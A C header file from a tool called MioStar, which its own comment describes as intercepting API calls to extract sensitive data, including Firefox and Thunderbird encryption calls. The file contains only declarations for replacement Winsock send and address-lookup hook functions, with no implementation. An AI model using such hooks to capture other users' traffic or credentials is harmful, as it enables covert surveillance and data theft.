/*
 * Tool name   : MioStar
 * Description : Tool to intercept API calls and to extract sensitive data.
 * Version     : 0.2
 * Date        : 11.17.2010
 * Author      : Ruben Unteregger
 * Web page    : http://www.megapanzer.com
 * Todo        : 
 * Changes     : 11.17.2010 nss3.dll to intercept Firefox, Thunderbird + Seamonkey crypt/decrypt calls
 *
 *
 * License     :
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 *
 */




#include <winsock2.h>
#include <Ws2spi.h>
#include <Windows.h>




#ifndef _SOCKETREPLACEMENT_H
#define _SOCKETREPLACEMENT_H

// VC++ 2010 Express didnt define the type LPLOOKUPSER ... 
typedef void (CALLBACK *LPLOOKUPSERVICE_COMPLETION_ROUTINE)( DWORD, DWORD, LPWSAOVERLAPPED );

int WINAPI MySend(SOCKET s, const char *buf, int len, int flags);
int WINAPI MyWSASend(SOCKET s, LPWSABUF lpBuffers, DWORD dwBufferCount, LPDWORD lpNumberOfBytesSent, DWORD dwFlags, LPWSAOVERLAPPED lpOverlapped, LPWSAOVERLAPPED_COMPLETION_ROUTINE lpCompletionRoutine);
int WINAPI MyWSPSendTo(SOCKET s, LPWSABUF lpBuffers, DWORD dwBufferCount, LPDWORD lpNumberOfBytesSent, DWORD dwFlags, const struct sockaddr *lpTo, int iTolen, LPWSAOVERLAPPED lpOverlapped, LPWSAOVERLAPPED_COMPLETION_ROUTINE lpCompletionRoutine, LPWSATHREADID lpThreadId, LPINT lpErrno);
int WSAAPI MyGetAddrInfoA(PCSTR pNodeName, PCSTR pServiceName, const ADDRINFOA *pHints, PADDRINFOA *ppResult);
int WSAAPI MyGetAddrInfoW(PCWSTR pNodeName, PCWSTR pServiceName, const ADDRINFOW *pHints, PADDRINFOW *ppResult);
int WSAAPI MyGetAddrInfoExA(PCSTR pName, PCSTR pServiceName, DWORD dwNameSpace, LPGUID lpNspId, const ADDRINFOEXA *pHints, PADDRINFOEXA *ppResult, struct timeval *timeout, LPOVERLAPPED lpOverlapped, LPLOOKUPSERVICE_COMPLETION_ROUTINE lpCompletionRoutine, LPHANDLE lpNameHandle);
int WSAAPI MyGetAddrInfoExW(PCWSTR pName, PCWSTR pServiceName, DWORD dwNameSpace, LPGUID lpNspId, const ADDRINFOEXW *pHints, PADDRINFOEXW *ppResult, struct timeval *timeout, LPOVERLAPPED lpOverlapped, LPLOOKUPSERVICE_COMPLETION_ROUTINE lpCompletionRoutine, LPHANDLE lpNameHandle);



typedef int (WINAPI *MYSEND)(SOCKET s, const char *buf, int len, int flags);
typedef int (WINAPI *MYWSASEND)(SOCKET s, LPWSABUF lpBuffers, DWORD dwBufferCount, LPDWORD lpNumberOfBytesSent, DWORD dwFlags, LPWSAOVERLAPPED lpOverlapped, LPWSAOVERLAPPED_COMPLETION_ROUTINE lpCompletionRoutine);
typedef int (WINAPI *MYWSPSENDTO)(SOCKET s, LPWSABUF lpBuffers, DWORD dwBufferCount, LPDWORD lpNumberOfBytesSent, DWORD dwFlags, const struct sockaddr *lpTo, int iTolen, LPWSAOVERLAPPED lpOverlapped, LPWSAOVERLAPPED_COMPLETION_ROUTINE lpCompletionRoutine, LPWSATHREADID lpThreadId, LPINT lpErrno);
typedef int (WSAAPI *MYGETADDRINFOA)(PCSTR pNodeName, PCSTR pServiceName, const ADDRINFOA *pHints, PADDRINFOA *ppResult);
typedef int (WSAAPI *MYGETADDRINFOW)(PCWSTR pNodeName, PCWSTR pServiceName, const ADDRINFOW *pHints, PADDRINFOW *ppResult);
typedef int (WSAAPI *MYGETADDRINFOEXA)(PCSTR pName, PCSTR pServiceName, DWORD dwNameSpace, LPGUID lpNspId, const ADDRINFOEXA *pHints, PADDRINFOEXA *ppResult, struct timeval *timeout, LPOVERLAPPED lpOverlapped, LPLOOKUPSERVICE_COMPLETION_ROUTINE lpCompletionRoutine, LPHANDLE lpNameHandle);
typedef int (WSAAPI *MYGETADDRINFOEXW)(PCWSTR pName, PCWSTR pServiceName, DWORD dwNameSpace, LPGUID lpNspId, const ADDRINFOEXW *pHints, PADDRINFOEXW *ppResult, struct timeval *timeout, LPOVERLAPPED lpOverlapped, LPLOOKUPSERVICE_COMPLETION_ROUTINE lpCompletionRoutine, LPHANDLE lpNameHandle);
#endif

